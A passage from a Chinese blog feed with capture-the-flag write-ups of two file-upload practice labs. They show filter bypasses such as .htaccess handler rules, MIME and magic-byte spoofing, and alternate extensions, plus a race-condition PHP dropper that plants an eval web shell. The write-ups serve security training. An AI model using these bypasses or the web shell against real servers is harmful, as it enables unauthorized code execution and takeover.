class="string">&#x27;delete_user.html&#x27;</span>, &#123;<span class="string">&#x27;success&#x27;</span>: <span class="string">&#x27;用户删除成功&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">&#x27;delete_user.html&#x27;</span>, &#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户不存在&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;delete_user.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用<code>delete</code>方法即可删除数据项</p></div>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web框架 </tag>
            
            <tag> Web程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再战upload</title>
      <link href="/2024/08/04/%E5%86%8D%E6%88%98upload/"/>
      <url>/2024/08/04/%E5%86%8D%E6%88%98upload/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继upload-labs靶场过后，博主又搜集到了一个评价不错的文件上传靶场，出自国光师傅的<a href="https://github.com/sqlsec/upload-labs-docker">upload-labs-docker</a>。里面有详细的搭建过程，故本文不再赘述。借此机会可以温习以下之前学过的知识，本次靶场共有13关，废话不多说，开始打靶！</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>访问靶机ip地址，映入眼帘的就是一个大大的<strong>javascript</strong>，不用多想，妥妥的<strong>js前端验证</strong>。上传一个<strong>shell.php</strong>试试<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042246328.png" alt="image-20240804224642018"></p><p>果然有弹窗，老办法，禁用javascript试试，发现上传成功。用蚁剑连接试试<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042253402.png" alt="image-20240804225323324"></p><h3 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h3><p>同样，本关给了提示，要用<code>.htaccess</code>文件绕过，编写<code>.htaccess</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该文件的意思是将<code>.jpg</code>为后缀的文件当作<code>.php</code>文件进行解析</p><p>随后上传<code>shell.jpg</code>为一句话木马，用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042333525.png" alt="image-20240804233340420"></p><h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>本关为<strong>MIME</strong>绕过，用bp抓包进行修改<code>content-type</code>字段就行<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042339985.png" alt="image-20240804233953810"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042341076.png" alt="image-20240804234116958"></p><h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>本关用文件头绕过，直接用bp抓包在php文件前面加上<code>GIF89a</code>，同时修改<code>conten-type</code>即可<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042353442.png" alt="image-20240804235355323"></p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408042354640.png" alt="image-20240804235423560"></p><h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p>观察源代码发现为黑名单过滤并且有个<code>str_ireplace</code>函数，会将在黑名单中的后缀名替换为空字符<code>&quot;&quot;</code>。于是直接尝试双写绕过，直接上传<code>shell.pphphp</code>发现上传成功，用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408050001811.png" alt="image-20240805000157729"></p><h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p>本关和<strong>pass-05</strong>不同的点就在于windows和linux对不同后缀的处理不一样，对于linux来说，后缀名的大小写是一样的，即<code>.Php</code>和<code>.php</code>一样，但是对于windows来说，它们是有区别的。于是尝试上传<code>.Php</code>为后缀的一句话木马，发现上传成功。</p><h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>这两关不知道为什么docker拉取镜像没有问题，但是容器就是显示不出来，复现失败。但从名字可以看出来是<strong>00截断</strong>，<strong>pass-07</strong>是属于<strong>GET</strong>型的，<strong>pass-08</strong>是属于<strong>POST</strong>型的。想练习的朋友可以自行去<strong>upload-labs靶场</strong>练习</p><h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>本关介绍了黑名单和白名单的区别，看给的提示就可以看出可以尝试一些特殊的php后缀，后台会将这些后缀直接当作php解析，上传一个<code>.php3</code>试试</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051337365.png" alt="image-20240805133721178"></p><h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><p>本关考察的是条件竞争。条件竞争的定义国光师傅已经在本关说明，总结一句话就是在后台还没来得及删除我们上传的木马的时候，我们先提前访问这个木马文件，而这个木马文件起到一个跳板的作用，当我们访问的时候会在后台生成一个一句话木马。因此就算之后后台把我们上传的木马给删除了，我们也在后台生成了一个一句话木马。这里我用的<code>shell.php</code>内容为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;a.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是在后台生成一个<code>a.php</code>的一句话木马，连接密码为<code>a</code>。若用国光师傅给的就是生成<code>xiao.php</code>，连接密码为<code>1</code>。</p><p>先用bp抓取上传<code>shell.php</code>的包，右键送到<code>intruder</code>模块。选择<code>payload</code>，修改下图两个地方<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051501137.png" alt="image-20240805150137758"></p><p>同时我们要设置线程，因为条件竞争说白了是并发出现了问题，在<code>Resource pool</code>里面设置如下内容<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051504760.png" alt="image-20240805150409444"></p><p>ps:不同bp版本设置线程的方法可能不一样，如果没有找到，请自行百度对应版本的线程设置方法。</p><p>接下来，将抓到的包<code>forward</code>出去，再去抓访问<code>shell.php</code>的包，访问<code>你的靶机ip/upload/shell.php</code>，bp抓完包后，同样送到<code>intruder</code>模块，在<code>shell.php</code>后面加上<code>?a=1</code>，同时给<code>1</code>加上<code>$</code>，我们要营造有10000个人访问<code>shell.php</code>的场景，如下图所示</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051510964.png" alt="image-20240805151006711"></p><p>在<code>payload</code>里面选择下图所示内容<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051511425.png" alt="image-20240805151109267"></p><p>同时把线程也设为30，然后两个同时开始攻击。结束后进入docker容器的后台查看<code>upload</code>文件夹</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051512439.png" alt="image-20240805151258382"></p><p>发现已经生成了<code>a.php</code>，用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408051513057.png" alt="image-20240805151352986"></p><h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>本关考察二次渲染，详细教程可以参考<a href="https://youngz-blog.asia/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/">upload-labs靶场全通关</a>（<del>绝对不是因为我懒</del>）</p><h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>本关其实考察的是自定义保存文件名称的时候会自动忽略<code>/.</code>，因此只需上传<code>shell.php</code>，将保存的名字设为<code>shell.php/.</code>即可</p><h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>本关取自upload-labs靶场第二十一关，当时写upload-labs的wp时没有明白其中的原理，看来国光师傅的wp之后发现这题考的是代码审计，于是根据wp搭建xdebug进行php调试<br><a href="https://www.sqlsec.com/2020/09/xdebug.html">xdebug搭建教程</a></p><p>下面对几个关键函数的调试结果分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里我先上传的是一个正常jpg方便演示代码是如何工作的，savename设置为upload-20.jpg</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);         </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;       <span class="comment">//检查content-type如果在数组里面就可以通过</span></span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//这个三目运算符是判断是否填写了savename，如果未填写$file就是上传图片的文件名，填写了就是savename的值。</span></span><br><span class="line">        <span class="comment">//所以调试结果为$file=upload-20.jpg</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="comment">//if语句判断$file是否为数组，很显然上传的不是数组，于是程序会将$file用点分割为一个数组</span></span><br><span class="line">        <span class="comment">//调试结果为$file=[0=&gt;&quot;uopload-20&quot;,1=&gt;&quot;jpg&quot;]</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//$ext获取数组元素最后一个值</span></span><br><span class="line">        <span class="comment">//$ext=&quot;jpg&quot;</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="comment">//$allow_suffix=[0=&gt;&#x27;jpg&#x27;,1=&gt;&#x27;png&#x27;,2=&gt;&#x27;gif&#x27;]</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="comment">//判断$ext是否在$allow_suffix数组中</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//reset函数将重置指针指到第一个元素，即返回第一个元素，count函数统计数组元素个数（这个是关键绕过点）</span></span><br><span class="line">            <span class="comment">//调试结果$file_name=upload-20.jpg</span></span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过调试结果可以看出，如果将$file设置为一个数组，并且数组元素个数为2，索引值为[0,2]在运行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这行代码的时候，<code>$file[count($file) - 1]=$file[2-1]=$file[1]</code>不存在，于是拼接后的文件名就为<code>shell.php.</code></p><p>具体操作如下：</p><ol><li>用bp抓包，修改<strong>content-type</strong>字段</li><li>把里面的<strong>save_name</strong>字段的索引值0的值设置为<code>shell.php</code>，随后复制一份（因为要包含两个数组元素），并把索引值设为<strong>2</strong>，值设置为<strong>jpg</strong></li></ol><p>这样在进行<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>操作时，由于<strong>$file[1]</strong>不存在，拼接后的文件名就为<code>shell.php.</code>即可绕过。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408121319393.png" alt="image-20240812131952004"></p><p><strong>ps：</strong>国光的wp里面是采用了<strong>pass-12</strong>里面的方法进行绕过，即<code>save_name[1]</code>设为<code>shell.php/</code>，但是我自己尝试上传失败，反倒是直接上传为<code>shell.php</code>成功了</p><p>后面直接用蚁剑连接<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202408121320355.png" alt="image-20240812132047292"></p><h2 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h2><p>本篇文章算是又复习了一遍文件上传的知识，感谢国光师傅的靶场，附上国光师傅自己写的wp</p><p><a href="https://www.sqlsec.com/2020/10/upload.html">国光的文件上传靶场知识总结</a></p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 基本漏洞 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs文件上传靶场全通关</title>
      <link href="/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/"/>
      <url>/2024/07/18/upload-labs%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><p>从GitHub上面直接下载源码<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>，用phpstudy搭建靶场，将下载解压后的文件放到WWW文件目录下即可，如出现一下界面即为搭建成功</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182047505.png" alt=""></p><h3 id="二、靶场实战"><a href="#二、靶场实战" class="headerlink" title="二、靶场实战"></a>二、靶场实战</h3><h4 id="pass-01（前端绕过）"><a href="#pass-01（前端绕过）" class="headerlink" title="pass-01（前端绕过）"></a><strong>pass-01</strong>（前端绕过）</h4><p>直接上传一个一句话木马shell.php试试，发现一个弹窗，只允许上传jpg、png、gif类型的文件。</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182049287.png" alt=""></p><p>很显然，这是一个js前端验证，即在前端界面就限制了上传文件的类型，上传的文件甚至都没有到后端的数据库，所以更别谈解析了。解决方法也很简单，直接关闭浏览器的前端验证就行。这里以火狐浏览器为例，在搜索栏输入<code>about:config</code>，发现如下界面，搜索<code>javascript</code>，找到<code>javascript.enabled</code>关闭就行</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182057192.png" alt=""></p><p>再次上传shell.php发现上传成功</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182100249.png" alt=""></p><p>之后直接用蚁剑连接就行了</p><h4 id="pass-02（MIME验证）"><a href="#pass-02（MIME验证）" class="headerlink" title="pass-02（MIME验证）"></a>pass-02（MIME验证）</h4><p>上传shell.php，这次没有前端弹窗，直接显示了上传文件类型不正确，查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是<strong>MIME(Multipurpose Internet Mail Extensions )</strong>验证，事实上对文件的后缀名并没有验证，只需用burpsuite进行抓包修改<code>content-type</code>字段就行</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407182200860.png" alt=""></p><p>之后直接用蚁剑连接就行了</p><h4 id="pass-03（特殊后缀绕过）"><a href="#pass-03（特殊后缀绕过）" class="headerlink" title="pass-03（特殊后缀绕过）"></a>pass-03（特殊后缀绕过）</h4><p>直接分析源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出，这关是一个黑名单过滤，不许上传.asp、.aspx、.php、.jsp后缀的文件，黑名单绕过相对比白名单简单一些的，毕竟，列举出所有可能的文件后缀还是有点难度的，漏掉一个都可能导致上传木马成功，这关过滤的后缀名比较少，尝试其它等效的php后缀名，例如php3，php5，phtml等等</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407191703193.png" alt=""></p><p>此关注意要将配置文件改成<code>AddTypeapplication/x-httpd-php .php .phtml .php5 .php3</code></p><p>这段代码的意思是将.php .phtml .php5 .php3的文件当作php文件解析，之后用蚁剑连接就行</p><h4 id="pass-04（-htaccess文件）"><a href="#pass-04（-htaccess文件）" class="headerlink" title="pass-04（.htaccess文件）"></a>pass-04（.htaccess文件）</h4><p>本关引入一个新的文件：<strong>.htaccess文件</strong></p><p><strong>.htaccess</strong>文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过<strong>.htaccess</strong>文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p><p>这样我们就可以通过<strong>.htaccess</strong>文件将.jpg文件解析为.php文件，创建<strong>.htaccess</strong>文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该文件的意思是将所有./jpg后缀的文件解析为php文件</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span 